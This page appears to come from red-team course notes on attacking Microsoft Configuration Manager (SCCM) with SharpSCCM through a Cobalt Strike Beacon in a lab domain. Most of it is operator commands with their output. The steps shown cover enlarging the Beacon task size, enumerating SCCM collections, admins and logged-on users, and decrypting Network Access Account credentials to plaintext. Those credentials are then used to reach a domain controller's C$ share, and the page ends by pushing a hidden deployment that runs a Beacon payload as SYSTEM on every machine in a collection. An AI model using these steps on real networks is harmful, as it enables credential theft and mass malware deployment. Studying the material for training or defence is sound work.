---
description: 10/02/2025
---

# ✅ Microsoft Configuration Manager

## Introduction to Configuration Manager

Microsoft Configuration Manager (often shortened to `ConfigMgr` or MCM).

It's primary role is to help with system management tasks such as application & software deployments, updates, and compliance configuration & reporting.&#x20;

The overall complexity of a deployment can vary from a single site, to a sprawling hierarchy of multiple primary and secondary sites.

The ability to connect multiple sites with scalability, particularly when dealing with different geographic locations.

**The examples below are taken from Microsoft documentation:**

![](https://files.cdn.thinkific.com/file_uploads/584845/images/eaa/aea/85e/1695900888150.jpg)

**SCCM** is an attractive target for attackers because given enough privilege, it can be used to push malicious scripts and applications to devices that it manages. &#x20;

The deployment in the RTO lab is only setup as a single site in order to demonstrate basic abuse primitives against Configuration Manager. &#x20;

There are further resources out there, including [this](https://medium.com/specter-ops-posts/sccm-hierarchy-takeover-41929c61e087) post by [Chris Thompson](https://twitter.com/_Mayyhem) that describes how a compromised primary site also compromises the entire hierarchy.

## Enumeration

The first step when attacking SCCM is to get a feel for the deployment topology, which devices are being managed, and who the administrative users are.

Throughout the remainder of this section, we will be using the [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) tool. &#x20;

Unfortunately, this tool is quite large, and its total compiled size is larger than the default task size allowed for Beacon. &#x20;

**Trying to run it with `execute-assembly` will throw an error:**

```
[-] Task size of 1727291 bytes is over the max task size limit of 1048576 bytes.
```

**There are two ways around this:**

1. Modify the tool and make it smaller
2. Modify Beacon's task size to make it larger

The latter option is quite straightforward because it can be controlled with the `tasks_max_size` setting in Malleable C2 - the downside is that it cannot be applied to existing beacons.

To double the task size, add `set tasks_max_size "2097152";` to the top of your C2 profile.

This can be found in `/opt/cobaltstrike/profiles/default.profile`.

{% hint style="warning" %}
**You will notice significantly more lag within the CS client when executing tasks with large artifacts.**&#x20;

**You must also remember to restart the team server and re-generate your payloads after making changes to the Malleable C2 profile.**
{% endhint %}

Given a foothold on a machine, we can begin by finding the management point and site code that it is linked to.

**This does not require and special privileges in the domain, in SCCM or on the endpoint:**

```
beacon> run hostname
wkstn-2

beacon> getuid
[*] You are DEV\bfarmer

beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local site-info --no-banner

-----------------------------------
CurrentManagementPoint: scm-1.cyberbotic.io
Name: SMS:S01
-----------------------------------
[+] Completed execution in 00:00:00.2733939
```

**This enumeration uses WMI under the hood, which could be done manually:**

```
beacon> powershell Get-WmiObject -Class SMS_Authority -Namespace root\CCM | select Name, CurrentManagementPoint | fl

Name                   : SMS:S01
CurrentManagementPoint : scm-1.cyberbotic.io
```

**We can also check the DACL on the&#x20;**<mark style="color:yellow;">**`CN=System Management`**</mark>**&#x20;container in AD for machines that have Full Control over it (as this is a pre-requisite of SCCM setup in a domain):**

```
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get site-info -d cyberbotic.io --no-banner

[!] Found 1 computer account(s) with GenericAll permission on the System Management container:

      CYBER\SCM-1$

[+] These systems are likely to be ConfigMgr site servers
[+] Completed execution in 00:00:00.4974129
```

Enumerating users, groups, computers, collections, and administrators, etc. does require some level of privilege in SCCM and cannot be done as a standard domain user.

SCCM employs an RBAC security model — the lowest role is "Read-Only Analyst".

Meanwhile, the highest role is "Full Administrator".

Furthermore, the "scope" of these roles can be restricted to individual collections as needed by the administrative user.

For example, computers from the `DEV` and `CYBER` domains have been grouped into their own collections.

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

This can impact your view as an attacker of how SCCM is configured.

**For example, if we were to enumerate all the collections as `bfarmer`, we can see that both `DEV` and `CYBER` exist as well as their member counts:**

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collections --no-banner

-----------------------------------
Name: DEV
MemberCount: 6
-----------------------------------
Name: CYBER
MemberCount: 4
-----------------------------------
[+] Completed execution in 00:00:00.6623964
```

**However, if we run the same enumeration as `jking`, a member of `DEV\Support` engineers, we only see the `DEV` collection:**

```
beacon> make_token DEV\jking Qwerty123
[+] Impersonated DEV\jking (netonly)

beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collections --no-banner

-----------------------------------
Name: DEV
MemberCount: 6
-----------------------------------
[+] Completed execution in 00:00:02.7849452
```

This is because even though `DEV\Developers` are only "Read-Only Analysts", the role is scoped to both collections.&#x20;

`DEV\Support` engineers are "Full Administrators" over the `DEV` collection but they have no roles that are scoped to the `CYBER` collection.

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**So when enumerating SCCM, you may only see a small slither based on the user you're running the enumeration as:**

```
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get class-instances SMS_Admin --no-banner

-----------------------------------
CategoryNames: All
CollectionNames: All Systems, All Users and User Groups
LogonName: SCM-1\Administrator
RoleNames: Full Administrator
-----------------------------------
CategoryNames: Default
CollectionNames: DEV, CYBER
LogonName: DEV\Developers
RoleNames: Read-only Analyst
-----------------------------------
CategoryNames: Default
CollectionNames: DEV
LogonName: DEV\Support Engineers
RoleNames: Full Administrator
-----------------------------------
CategoryNames: All
CollectionNames: All Systems, All Users and User Groups
LogonName: CYBER\Domain Admins
RoleNames: Full Administrator
-----------------------------------
[+] Completed execution in 00:00:06.0664364
```

This allows us to see what is reflected in the Configuration Manager GUI above.

Members of these collections can be found using `get collection-members -n <collection-name>`:

```
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collection-members -n DEV --no-banner

-----------------------------------
Domain: DEV
Name: WKSTN-2
-----------------------------------
Domain: DEV
Name: SQL-2
-----------------------------------
Domain: DEV
Name: WKSTN-1
-----------------------------------
Domain: DEV
Name: DC-2
-----------------------------------
Domain: DEV
Name: FS
-----------------------------------
Domain: DEV
Name: WEB
-----------------------------------
[+] Completed execution in 00:00:03.2562318
```

**Even more information on each device can be obtained via&#x20;**<mark style="color:yellow;">**`get devices`**</mark>**. There are some good ways to filter the output, such as searching by device name,&#x20;**<mark style="color:yellow;">**`-n`**</mark>**, and only displaying the properties specified by&#x20;**<mark style="color:yellow;">**`-p`**</mark>**:**

```
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get devices -n WKSTN -p Name -p FullDomainName -p IPAddresses -p LastLogonUserName -p OperatingSystemNameandVersion --no-banner

-----------------------------------
FullDomainName: DEV.CYBERBOTIC.IO
IPAddresses: 10.10.123.101
LastLogonUserName: nlamb
Name: WKSTN-1
OperatingSystemNameandVersion: Microsoft Windows NT Workstation 10.0
-----------------------------------
FullDomainName: DEV.CYBERBOTIC.IO
IPAddresses: 10.10.123.102
LastLogonUserName: bfarmer
Name: WKSTN-2
OperatingSystemNameandVersion: Microsoft Windows NT Workstation 10.0
-----------------------------------
[+] Completed execution in 00:00:01.3059878
```

You can also use SCCM as a form of user hunting, since it records the last user to login to each managed computer.

**The&#x20;**<mark style="color:yellow;">**`-u`**</mark>**&#x20;parameter will only return devices where the given user was the last to login:**

```
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get devices -u nlamb -p IPAddresses -p IPSubnets -p Name --no-banner

-----------------------------------
IPAddresses: 10.10.123.101
IPSubnets: 10.10.122.0
Name: WKSTN-1
-----------------------------------
[+] Completed execution in 00:00:01.7570393
```

{% hint style="info" %}
Keep these results worth a grain of salt because this information is only updated in SCCM every 7 days by default.
{% endhint %}

## Network Access Account Credentials

In a Windows environment, the majority of computers will be domain-joined and will therefore authenticate to SCCM Software Distribution Points (SDPs — which are pretty much just SMB shares) using their own machine account credentials.

However, some computers may not be domain-joined.&#x20;

Network Access Account credentials (NAAs) are domain credentials that are intended to be used by these machines to access the SDPs over the network. They are passed to the machines as part of the SCCM machine policies, which are then encrypted using DPAPI and stored locally.

If they are present, privileged users can retrieve these credentialed blobs via WMI or directly from disk and decrypt them to recover plaintext credentials:

**Use&#x20;**<mark style="color:yellow;">**`local naa`**</mark>**&#x20;with&#x20;**<mark style="color:yellow;">**`-m wmi`**</mark>**&#x20;or&#x20;**<mark style="color:yellow;">**`-m disk`**</mark>**:**

```
beacon> getuid
[*] You are DEV\bfarmer (admin)

beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local naa -m wmi --no-banner

[+] Connecting to \\127.0.0.1\root\ccm\policy\Machine\ActualConfig
[+] Retrieving network access account blobs via WMI
[+] Retrieving task sequence blobs via WMI
[+] Retrieving collection variable blobs via WMI

[...snip...]

[+] Decrypting network access account credentials

    NetworkAccessUsername: cyberbotic.io\sccm_svc
    NetworkAccessPassword: Cyberb0tic
```

**These credentials should only have read access to the SDP, but are often times over privileged (sometimes to domain/enterprise admins):**

```
beacon> make_token cyberbotic.io\sccm_svc Cyberb0tic
[+] Impersonated cyberbotic.io\sccm_svc (netonly)

beacon> ls \\dc-1.cyberbotic.io\c$
[*] Listing: \\dc-1.cyberbotic.io\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/15/2022 15:26:54   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
          dir     08/18/2021 23:34:55   Documents and Settings
          dir     08/19/2021 06:24:49   EFI
          dir     05/08/2021 08:20:24   PerfLogs
          dir     09/26/2023 09:07:25   Program Files
          dir     08/10/2022 04:06:16   Program Files (x86)
          dir     09/26/2023 09:13:26   ProgramData
          dir     08/15/2022 15:07:48   Recovery
          dir     08/24/2022 11:05:32   Shares
          dir     09/26/2023 14:28:24   System Volume Information
          dir     08/15/2022 15:09:04   Users
          dir     09/26/2023 09:10:03   Windows
 427kb    fil     08/10/2022 05:00:07   bootmgr
 1b       fil     05/08/2021 08:14:33   BOOTNXT
 12kb     fil     09/27/2023 09:28:28   DumpStack.log.tmp
 1kb      fil     09/25/2023 19:07:33   ExtADSch.log
 384mb    fil     09/27/2023 09:28:28   pagefile.sys
```

An alternate approach is to request a copy of the policy directly from SCCM using <mark style="color:yellow;">`get naa`</mark>.

This also requires local admin on the local machine to obtain a copy of its SMS Signing and SMS Encryption certificates.

## Lateral Movement

With Full or Application Administrator privileges over a device or a collection, we can deploy scripts or applications to aid in lateral movement.

**To execute a command on every device in the&#x20;**<mark style="color:yellow;">**`DEV`**</mark>**&#x20;collection, we could do&#x20;**<mark style="color:yellow;">**`exec -n DEV -p <path>`**</mark>**:**

```
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe exec -n DEV -p C:\Windows\notepad.exe --no-banner

[+] Creating new application: Application_4b981c0c-ccc4-4971-b6cc-ff774770be5c
[+] Application path: C:\Windows\notepad.exe
[+] Updated application to hide it from the Configuration Manager console
[+] Updated application to run in the context of the logged on user
[+] Successfully created application

[+] Creating new deployment of Application_4b981c0c-ccc4-4971-b6cc-ff774770be5c to DEV (S0100014)
[+] Found the Application_4b981c0c-ccc4-4971-b6cc-ff774770be5c application
[+] Successfully created deployment of Application_4b981c0c-ccc4-4971-b6cc-ff774770be5c to DEV (S0100014)
[+] New deployment name: Application_4b981c0c-ccc4-4971-b6cc-ff774770be5c_S0100014_Install
[+] Waiting for new deployment to become available...
[+] New deployment is available, waiting 30 seconds for updated policy to become available
[+] Forcing all members of DEV (S0100014) to retrieve machine policy and execute any new applications available
[+] Waiting 1 minute for execution to complete...

[+] Cleaning up

[+] Found the Application_4b981c0c-ccc4-4971-b6cc-ff774770be5c_S0100014_Install deployment
[+] Deleted the Application_4b981c0c-ccc4-4971-b6cc-ff774770be5c_S0100014_Install deployment
[+] Querying for deployments of Application_4b981c0c-ccc4-4971-b6cc-ff774770be5c_S0100014_Install
[+] No remaining deployments named Application_4b981c0c-ccc4-4971-b6cc-ff774770be5c_S0100014_Install were found
[+] Found the Application_4b981c0c-ccc4-4971-b6cc-ff774770be5c application

[+] Deleted the Application_4b981c0c-ccc4-4971-b6cc-ff774770be5c application
[+] Querying for applications named Application_4b981c0c-ccc4-4971-b6cc-ff774770be5c
[+] No remaining applications named Application_4b981c0c-ccc4-4971-b6cc-ff774770be5c were found

[+] Completed execution in 00:02:18.2210387
```

SharpSCCM attempts to hide the application (i.e. the command we're executing) from the GUI, but the deployment is still visible until it completes.

<figure><img src="../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

By default, the above will execute Notepad as the user currently logged into each machine.&#x20;

If a user is not logged in, then the command won't execute.&#x20;

We can force it to execute as <mark style="color:yellow;">`SYSTEM`</mark> using the <mark style="color:yellow;">`-s`</mark> parameter, this will execute on every machine regardless of whether a user is currently logged in or not.&#x20;

**As with the GPO Abuse section, we can upload and execute a DNS Beacon payload:**

```
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe exec -n DEV -p "C:\Windows\System32\cmd.exe /c start /b \\dc-2\software\dns_x64.exe" -s --no-banner
```

<figure><img src="../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
